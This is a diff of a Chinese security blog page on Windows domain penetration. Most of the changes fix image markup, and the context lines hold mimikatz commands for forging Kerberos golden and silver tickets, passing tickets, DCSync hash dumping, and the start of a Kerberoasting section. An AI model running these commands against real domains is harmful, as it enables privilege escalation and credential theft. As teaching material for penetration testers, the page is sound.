@@ -98,8 +98,11 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/Kerberos.png">
 <meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/pass-the-ticket.png">
+<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/Golden_Ticket1.png">
+<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/Golden_Ticket2.png">
+<meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/Silver_Ticket1.png">
 <meta property="og:image" content="https://sp4rr0w.github.io/2018/02/19/域渗透相关/getspn.png">
-<meta property="og:updated_time" content="2018-03-31T03:37:41.440Z">
+<meta property="og:updated_time" content="2018-03-31T03:41:28.680Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="域渗透相关">
 <meta name="twitter:description" content="…..">
@@ -496,6 +499,7 @@ mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:用戶a /domain:
     5.2 域账户名称 - 通常是域管理员&quot;domain admin&quot;
     5.3 域名
     5.4 域SID - 可以从域用户的SID或通过sysinternal中psGetsid.exe获得
+
 6 简单过程:
     6.1 清空缓存证书
     kerberos::purge  ( or klist purge)
@@ -503,13 +507,13 @@ mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:用戶a /domain:
     kerberos::golden /admin:administrator /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /krbtgt:3f65c6984cbfebdc5f17986d07620afb /ticket:administrator.kirbi.bin
     6.3 使用这张票据 
     kerberos::ptt administrator.kirbi.bin
-        ![Golden_Ticket1](域渗透相关/Golden_Ticket1.png)
-    6.4 然后我的低权限本地用户，就被提升到域管理权限
+</code></pre><p><img src="/2018/02/19/域渗透相关/Golden_Ticket1.png" alt="Golden_Ticket1"></p>
+<pre><code>    6.4 然后我的低权限本地用户，就被提升到域管理权限
     kerberos::list
     6.5 利用dcsync功能获取hash,通过DRSR(目录复制服务DRS远程协议)协议，从域控制器获取任何用户的hash
     lsadump::dcsync /domain:demo.local /user:testwin10  (administrator / testwin7)
-        ![Golden_Ticket2](域渗透相关/Golden_Ticket2.png)
-</code></pre><h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket (白银票据)"></a>Silver Ticket (白银票据)</h2><p>简义 : 发生在上面的过程5，可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管。</p>
+</code></pre><p><img src="/2018/02/19/域渗透相关/Golden_Ticket2.png" alt="Golden_Ticket2"></p>
+<h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket (白银票据)"></a>Silver Ticket (白银票据)</h2><p>简义 : 发生在上面的过程5，可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管。</p>
 <p>Silver Ticket生成时指定了相关的服务名，因此只能用来访问相应的服务，所以局限性比较大，没有golden ticket好用</p>
 <p>所需条件(mimikatz生成silver ticket)</p>
 <pre><code>1. /domain
@@ -531,8 +535,8 @@ Windows Remote Server    RPCSS、LDAP、CIFS
 </code></pre><p>用法</p>
 <pre><code>kerberos::golden /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /target:owa2010dc.demo.local /service:cifs /rc4:aac6185241728f7685c8d50c61573b75 /user:silver /ptt
 (/rc4:aac6185241728f7685c8d50c61573b75 這裏我用的是owa2010dc$机器賬戶的NTLM hash
-![Silver_Ticket1](域渗透相关/Silver_Ticket1.png)
-</code></pre><h2 id="Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><p>简义 : 发生在上面的过程3,4, 目标的服务账户的服务器主体名称(SPN)请求一个Kerberos服务票据 (TGS) 。</p>
+</code></pre><p><img src="/2018/02/19/域渗透相关/Silver_Ticket1.png" alt="Silver_Ticket1"></p>
+<h2 id="Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><p>简义 : 发生在上面的过程3,4, 目标的服务账户的服务器主体名称(SPN)请求一个Kerberos服务票据 (TGS) 。</p>
 <p>这里会采用一个有效的用户认证票据(TGT)来请求一个或几个运行在服务器上的目标服务票据。</p>
 <p>域控不会检测用户是否真正连接到了这些资源上(即使用户可能真的有权限访问)。</p>
 <p>域控会在活动目录中查找SPN并且用SPN关联的用户账户把票据进行加密，以此赋予用户访问服务的权限。</p>
